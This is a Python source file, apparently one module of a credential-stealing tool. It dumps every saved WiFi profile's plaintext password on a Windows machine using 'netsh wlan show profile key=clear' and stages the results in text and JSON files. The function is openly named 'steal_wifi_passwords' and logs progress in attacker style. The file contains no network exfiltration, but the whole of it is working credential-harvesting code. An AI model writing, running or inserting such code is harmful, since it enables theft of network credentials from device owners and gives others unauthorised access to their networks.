import os
import subprocess
import re
import json
from datetime import datetime
from typing import List, Dict

class WiFiProfile:
    def __init__(self, ssid: str, password: str, security: str, auth_type: str = ""):
        self.ssid = ssid
        self.password = password
        self.security = security
        self.auth_type = auth_type

def get_wifi_profiles() -> List[WiFiProfile]:
    # Extract all saved WiFi profiles and passwords from Windows 
    profiles = []
    
    try:
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'profiles'], 
            capture_output=True, 
            text=True, 
            encoding='utf-8', 
            errors='ignore'
        )
        
        ssid_pattern = r"All User Profile\s*:\s*(.+)"
        ssids = re.findall(ssid_pattern, result.stdout)
        
        for ssid in ssids:
            ssid = ssid.strip()
            try:
                profile_result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', f'name="{ssid}"', 'key=clear'],
                    capture_output=True,
                    text=True,
                    encoding='utf-8',
                    errors='ignore'
                )
                
                output = profile_result.stdout
                password = ""
                pass_match = re.search(r"Key Content\s*:\s*(.+)", output)
                if pass_match:
                    password = pass_match.group(1).strip()
                
                security = "Unknown"
                sec_match = re.search(r"Authentication\s*:\s*(.+)", output)
                if sec_match:
                    security = sec_match.group(1).strip()
                
                auth = ""
                auth_match = re.search(r"Cipher\s*:\s*(.+)", output)
                if auth_match:
                    auth = auth_match.group(1).strip()
                
                profiles.append(WiFiProfile(ssid, password, security, auth))
                
            except Exception as e:
                profiles.append(WiFiProfile(ssid, f"[Error: {str(e)}]", "Error"))
                
    except Exception as e:
        print(f"[!] WiFi extraction error: {e}")
    
    return profiles

def steal_wifi_passwords(output_dir: str) -> Dict:
    # Function to extract and save WiFi passwords
    print("[*] Extracting WiFi passwords...")
    
    profiles = get_wifi_profiles()
    
    if not profiles:
        return {"count": 0, "networks": []}
    
    txt_path = os.path.join(output_dir, "wifi_passwords.txt")
    with open(txt_path, 'w', encoding='utf-8') as f:
        f.write("=" * 80 + "\n")
        f.write("EXTRACTED WIFI PASSWORDS\n")
        f.write(f"Generated: {datetime.now().isoformat()}\n")
        f.write("=" * 80 + "\n\n")
        
        for i, profile in enumerate(profiles, 1):
            f.write(f"[{i}] Network: {profile.ssid}\n")
            f.write(f"    Password: {profile.password if profile.password else '[OPEN NETWORK]'}\n")
            f.write(f"    Security: {profile.security}\n")
            f.write(f"    Encryption: {profile.auth_type}\n")
            f.write("-" * 80 + "\n")
    
    json_path = os.path.join(output_dir, "wifi_passwords.json")
    data = {
        "timestamp": datetime.now().isoformat(),
        "total_networks": len(profiles),
        "networks_with_passwords": sum(1 for p in profiles if p.password),
        "networks": [
            {
                "ssid": p.ssid,
                "password": p.password,
                "security": p.security,
                "encryption": p.auth_type
            }
            for p in profiles
        ]
    }
    
    with open(json_path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    
    print(f"[+] Extracted {len(profiles)} WiFi profiles ({data['networks_with_passwords']} with passwords)")
    
    return data